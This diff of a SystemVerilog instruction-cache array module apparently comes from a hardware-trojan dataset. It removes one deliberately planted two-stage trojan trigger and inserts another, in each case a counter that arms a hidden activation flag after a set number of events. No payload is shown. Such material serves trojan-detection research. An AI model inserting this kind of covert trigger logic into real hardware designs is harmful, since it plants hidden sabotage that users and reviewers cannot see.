@@ -25,27 +25,6 @@ module ICacheArray_trojan_Integrity(
     output logic           hit, valid
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13408;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|writeIndex) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && writeLineData) trojan_active <= 1'b1;
-        end
-    end
-
-
     typedef struct packed {
         ICacheLinePath     data;
         ICacheTagValidPath meta;
@@ -68,6 +47,26 @@ module ICacheArray_trojan_Integrity(
         .ra( readIndex ),
         .rv( readWayData )
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=10098)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 10098;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
 
     always_comb begin
         // ICacheTagPath-array write
